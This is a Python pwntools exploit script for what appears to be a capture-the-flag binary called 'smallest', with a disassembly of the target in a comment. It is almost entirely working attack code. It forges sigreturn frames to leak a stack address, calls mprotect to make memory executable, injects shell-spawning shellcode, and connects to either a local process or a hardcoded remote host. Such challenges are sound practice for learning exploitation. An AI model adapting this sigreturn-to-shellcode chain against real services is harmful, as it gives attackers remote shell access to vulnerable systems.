from pwn import *

'''
.text:00000000004000B0 start           proc near
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h
.text:00000000004000B8                 mov     rsi, rsp
.text:00000000004000BB                 mov     rdi, rax
.text:00000000004000BE                 syscall
.text:00000000004000C0                 retn
.text:00000000004000C0 start           endp
'''
# 3 argv rdi rsi rdx 

# switch remote
rr = 0

def init():
	context.log_level = 'debug'
	context.arch = 'amd64'
	context.terminal = ['terminator', '-x', 'bash', '-c']

def s(string):
	sleep(0.1)
	return cn.send(string)
	
def sl(string):
	return cn.sendline(string)
	
def r():
	return cn.recv()

def ru(string):
	return cn.recvuntil(string)

def p(num):
	return p64(num)

def u(string):
	return u64(string)
	
def getsh():
	sl('whoami')
	r()
	#cn.interactive()

def pwn():
	init()
	
	frame = SigreturnFrame(kernel = 'amd64')
	p_syscall_ret = 0x4000be
	p_start = 0x4000b0
	
	s(p(p_start) + p(0x4000bb) + p(p_start))
	s('\xbb')#syscall_wtite = 1(read '\xbb'->rax = 1)
	data = r()
	stack = u(data[16:24]) - 0x1000
	frame.rax = constants.SYS_read
	frame.rdi = 0
	frame.rsi = stack
	frame.rdx = 0x400
	frame.rip = p_syscall_ret
	frame.rsp = stack
	
	
	raw_input()
	s(p(p_start)+p(p_syscall_ret)+str(frame))
	raw_input()
	s(p(p_syscall_ret)+'a'*7)#sigreturn 
	
	pay_adr = 0x400000
	pay = asm(shellcraft.amd64.sh())
	frame.rax = constants.SYS_mprotect
	frame.rdi = pay_adr
	frame.rsi = len(pay)
	frame.rdx = 7
	frame.rsp = stack
	
	s(p(p_start)+p(p_syscall_ret)+str(frame)) # write to stack
	s(p(p_syscall_ret)+'a'*7)#sigreturn 

	frame.rax = constants.SYS_read
	frame.rdi = 0
	frame.rsi = 0x400300
	frame.rdx = 0x30
	
	raw_input()
	s(p(p_start)+p(p_syscall_ret)+str(frame))
	s(p(p_syscall_ret)+'a'*7)

	s(pay)
	s(p(0x400300))
	getsh()


#######

if rr == 0:
	cn = process('./smallest')
else:
	cn = remote("106.75.61.55", 20000)

pwn()
	
	
	
